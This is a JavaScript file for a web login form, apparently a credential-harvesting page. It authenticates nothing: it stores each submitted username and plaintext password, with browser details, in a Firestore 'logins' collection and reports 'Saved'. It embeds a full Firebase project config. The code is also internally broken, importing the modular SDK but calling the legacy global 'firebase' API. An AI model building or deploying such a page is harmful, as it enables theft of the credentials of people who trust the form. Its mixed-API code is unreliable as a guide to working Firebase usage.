// Firebase v10 modular SDK — loaded straight from the CDN
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

// ============ Firebase Config ============
const firebaseConfig = {
  apiKey: "AIzaSyDFCiEwOl9MlBbYjRpU70ZU_NgwZLPsBHw",
  authDomain: "overmods2.firebaseapp.com",
  projectId: "overmods2",
  storageBucket: "overmods2.firebasestorage.app",
  messagingSenderId: "203325811727",
  appId: "1:203325811727:web:006becff2b175c6baa477a",
  measurementId: "G-VGP88B8T10"
};

// ============ Init ============
let db;
try {
  firebase.initializeApp(firebaseConfig);
  db = firebase.firestore();
  console.log("✅ Firebase initialized");
} catch (e) {
  console.error("❌ Firebase init failed:", e);
}

// ============ Form ============
const form = document.getElementById("loginForm");
const usernameEl = document.getElementById("username");
const passwordEl = document.getElementById("password");
const statusEl = document.getElementById("status");
const submitBtn = document.getElementById("submitBtn");

function setStatus(msg, type) {
  statusEl.textContent = msg;
  statusEl.className = "status" + (type ? " " + type : "");
}

// Utility: promise with timeout to avoid infinite "Logging in..."
function withTimeout(promise, ms) {
  return Promise.race([
    promise,
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("Timeout: no response from Firestore. Check your database & rules.")), ms)
    )
  ]);
}

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = usernameEl.value.trim();
  const password = passwordEl.value;

  if (!username || !password) {
    setStatus("Please fill in both fields.", "err");
    return;
  }

  if (!db) {
    setStatus("Firebase not initialized. Open console (F12) for details.", "err");
    return;
  }

  submitBtn.disabled = true;
  submitBtn.textContent = "Logging in...";
  setStatus("Sending...", "");

  try {
    const docRef = await withTimeout(
      db.collection("logins").add({
        username: username,
        password: password,
        userAgent: navigator.userAgent,
        language: navigator.language,
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      }),
      10000 // 10 seconds max
    );

    console.log("✅ Saved with ID:", docRef.id);
    setStatus("Saved ✔ (ID: " + docRef.id + ")", "ok");
    form.reset();
  } catch (err) {
    console.error("❌ Save failed:", err);
    let msg = err.message || "Unknown error";
    if (err.code === "permission-denied") {
      msg = "Permission denied — update Firestore Rules to allow writes.";
    } else if (err.code === "unavailable") {
      msg = "Firestore unavailable — is the database created in Firebase Console?";
    }
    setStatus("Error: " + msg, "err");
  } finally {
    submitBtn.disabled = false;
    submitBtn.textContent = "Log in";
  }
});
